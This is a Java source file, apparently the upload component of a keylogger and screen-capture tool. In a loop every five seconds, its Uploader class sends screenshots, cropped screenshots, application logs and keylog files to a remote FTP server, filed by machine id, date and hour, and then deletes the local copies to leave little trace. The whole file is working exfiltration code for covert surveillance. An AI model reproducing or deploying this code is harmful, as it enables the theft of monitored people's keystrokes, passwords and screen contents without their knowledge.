import org.apache.commons.io.FilenameUtils;
import org.apache.log4j.Logger;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.Date;
import java.util.List;

/**
 * Created by mihai on 5/21/2016.
 */
public class Uploader implements Runnable {

    private int maxNoLocalFiles = 5000;
    private String localRootImages;
    //private String rootImagesPathOnServer;

    private File current_date_folder = null;

    private FTPCredentials credentials = null;

    //private String rootCroppedImagesPathOnServer;
    private String uniqueFilename;

    //time to wait until this class uploads log file sto the server measured in seconds
    //private static long TIMEOUT_UPLOAD_LOG_FILES = 0;

    //time elapsed until last log was uploaded measured in seconds
    private static long timeElapsedUntilLastLogUpload = 0;

/*    private static String remoteRootLogPath = "";
    private static String logFileName = "";*/

    private AppConfig appConfig = null;

    private final static Logger logger = Logger.getLogger(Uploader.class);

    public Uploader(AppConfig appConfig, String uniqueFilename)
    {
        this.appConfig = appConfig;
        this.credentials = appConfig.getCredentials();
        this.uniqueFilename = uniqueFilename;
        this.localRootImages = appConfig.getImagesLocalRootFolder();
        this.maxNoLocalFiles = appConfig.getMaxNoScreenshotsStored();

        current_date_folder = new File(localRootImages);
    }


    @Override
    public void run() {

        if(current_date_folder.exists())
        {
            while(true)
            {

                long startTime = System.currentTimeMillis();

                try
                {

                    /*
                    * Upload taken screenshots and cropped screenshots to server
                    * */
                    uploadImages();

                    /*
                    * Upload Log4j application log
                    * */
                    uploadLog4jLogFiles();

                    /*
                    * Upload key log files
                    * */
                    uploadKeyLogFiles();



                    //add elapsed seconds
                    long stopTime = System.currentTimeMillis();
                    long elapsedTime = stopTime - startTime;

                    timeElapsedUntilLastLogUpload = timeElapsedUntilLastLogUpload *1000 + elapsedTime;
                    timeElapsedUntilLastLogUpload = timeElapsedUntilLastLogUpload/1000;

                    //uploads file with 5 seconds delay
                    Thread.sleep(5000);
                }
                catch(Exception e)
                {
                    System.out.println("Exceptie in Uploader: ");
                    e.printStackTrace();
                    logger.error("Exception in Uploader->run()->",e);
                }
            }
        }
    }


    private void uploadKeyLogFiles() throws Exception
    {

        List<String> keyLoggerFilenames = listKeyLoggerFilesFromDirectory(localRootImages);

        if(!keyLoggerFilenames.isEmpty())
        {

            //make a FTP connection with the server
            FTPClientApplication ftpCLient =
                    new FTPClientApplication(credentials);

            for(String filename:keyLoggerFilenames)
            {
                String remotePath = "";

                //keylog_date_2016_09_07_12_52
                String[] parts = filename.split("_");

                String name_with_current_date = parts[2] + "_" + parts[3] + "_" + parts[4];
                String hour_folder_name = "H_" + parts[5];

                /*
                * filter key log files in order to upload
                * just those which are older than current minute
                * */
                String keylog_minute = parts[6];

                //remove extension .txt
                String[] minute_parts = keylog_minute.split(".txt");

                keylog_minute = minute_parts[0];

                int keylog_minute_int = Integer.parseInt(keylog_minute);


                Date date = new Date();
                DateFormat dateFormat = new SimpleDateFormat("mm");

                String current_minute = (dateFormat.format(date)).toString();
                int current_minute_int = Integer.parseInt(current_minute);

                if(current_minute_int == keylog_minute_int)
                {

                    /*
                    * if current minute is the same with the key log minute
                    * then step over uploading current key log
                    * */

                    continue;
                }

                remotePath = appConfig.getRootImagesPathOnServer() +
                        "/" + uniqueFilename + "/" +
                        name_with_current_date + "/" +
                        hour_folder_name + "/Log";

                ftpCLient.makeDirectories(remotePath);

                //upload current key log file to server
                if(ftpCLient.uploadFile(localRootImages + "/" + filename,
                        remotePath, filename))
                {
                    //TODO:
                    // delete keylog file only if it is uploaded successfuly

                }

                Files.deleteIfExists(Paths.get(localRootImages + "/" + filename));


            }

            //logout and disconnect from the server
            ftpCLient.logoutAndDisconnect();
        }
    }

    public void uploadLog4jLogFiles() throws Exception
    {
        if(timeElapsedUntilLastLogUpload >= appConfig.getTIMEOUT_UPLOAD_LOG_FILES())
        {

            //make a FTP connection with the server
            FTPClientApplication ftpCLient =
                    new FTPClientApplication(credentials);


            Date date = new Date();

            DateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd");
            String current_date_formatted_day = (dateFormat.format(date)).toString();

            String current_date_formatted_hour = "H_" + new SimpleDateFormat("HH").format(date);


            String remotePath = appConfig.getRemoteRootLogPath() + "/" + uniqueFilename + "/" +
                    current_date_formatted_day + "/" + current_date_formatted_hour;

            ftpCLient.makeDirectories(remotePath);

            List<String> logs = listLog4jFilesFromDirectory(current_date_folder.getAbsolutePath());

            for(String log:logs)
            {
                //upload current screenshot to server
                boolean success = ftpCLient.uploadFile(current_date_folder.getAbsolutePath() + "/" +
                                appConfig.getLogFileName(),
                        remotePath, log);
            }

            //logout and disconnect from the server
            ftpCLient.logoutAndDisconnect();

            timeElapsedUntilLastLogUpload = 0;
        }
    }

    public void uploadImages() throws Exception
    {
        List<String> screenshotNameList =
                listImageFilesFromDirectory(current_date_folder.getAbsolutePath());

        if(screenshotNameList.size() >= 10)
        {
            String name_with_current_date;
            String hour_folder_name;

            //make a FTP connection with the server
            FTPClientApplication ftpCLient =
                    new FTPClientApplication(credentials);


            if(screenshotNameList.size() >= maxNoLocalFiles)
            {

                screenshotNameList.sort(new Comparator<String>() {
                    @Override
                    public int compare(String o1, String o2) {
                        return o1.compareTo(o2);
                    }
                });

                int no_files_to_delete = screenshotNameList.size() - maxNoLocalFiles;

                for(int k = 0;k<no_files_to_delete;k++)
                {
                    String screenshot = screenshotNameList.get(k);
                    Files.deleteIfExists(Paths.get(current_date_folder.getAbsolutePath() +
                            "/" + screenshot));

                }

                screenshotNameList =
                        listImageFilesFromDirectory(current_date_folder.getAbsolutePath());

            }

            for(String screenshot:screenshotNameList)
            {

                String remotePath = "";

                //screenshot_10_2016_05_21_12_48_43.jpg
                String[] parts = screenshot.split("_");

                name_with_current_date = parts[2] + "_" + parts[3] + "_" + parts[4];
                hour_folder_name = "H_" + parts[5];


                //if current screenshot is cropped
                if(parts.length > 8 && parts[8].equals("cropped.jpg"))
                {

                    remotePath = appConfig.getRootCroppedImagesPathOnServer()+
                            "/" + uniqueFilename + "/" +
                            name_with_current_date + "/" +
                            hour_folder_name;

                    ftpCLient.makeDirectories(remotePath);

                    //upload current screenshot to server
                    ftpCLient.uploadFile(current_date_folder.getAbsolutePath() + "/" + screenshot,
                            remotePath, screenshot);

                    Files.delete(Paths.get(current_date_folder.getAbsolutePath() + "/" + screenshot));

                }
                else
                {
                    remotePath = appConfig.getRootImagesPathOnServer() +
                            "/" + uniqueFilename + "/" +
                            name_with_current_date + "/" +
                            hour_folder_name;

                    ftpCLient.makeDirectories(remotePath);

                    //upload current screenshot to server
                    ftpCLient.uploadFile(current_date_folder.getAbsolutePath() + "/" + screenshot,
                            remotePath, screenshot);

                    Files.delete(Paths.get(current_date_folder.getAbsolutePath() + "/" + screenshot));
                }


            }

            //logout and disconnect from the server
            ftpCLient.logoutAndDisconnect();


            //TODO: delete only if screenshot was successfully uploaded to server
            //delete files and clear list with paths
/*            for(String filename: screenshotNameList)
            {
                Files.deleteIfExists(Paths.get(current_date_folder.getAbsolutePath() +
                        "/" + filename));
            }*/
        }

    }

    public static List<String> listImageFilesFromDirectory(String path)
    {
        List<String> fileNameList = new ArrayList<String>();

        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();

        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {
                //System.out.println("File " + listOfFiles[i].getName());
                String ext = FilenameUtils.getExtension(listOfFiles[i].getAbsolutePath());

                if(ext.equals("jpg") || ext.equals("jpeg") || ext.equals("png"))
                {
                    fileNameList.add(listOfFiles[i].getName());
                }
            }
        }

        return fileNameList;

    }

    public static List<String> listKeyLoggerFilesFromDirectory(String path)
    {
        List<String> fileNameList = new ArrayList<String>();

        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();

        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {

                /*
                * detects all key log files after their name
                * */
                if(listOfFiles[i].getName().contains("keylog"))
                {
                    fileNameList.add(listOfFiles[i].getName());
                }
            }
        }

        return fileNameList;

    }


    public static List<String> listLog4jFilesFromDirectory(String path)
    {
        List<String> fileNameList = new ArrayList<String>();

        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();

        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {

                /*
                * detects all log files after their name
                * */
                if(listOfFiles[i].getName().contains("log4j"))
                {
                    fileNameList.add(listOfFiles[i].getName());
                }
            }
        }

        return fileNameList;

    }
}
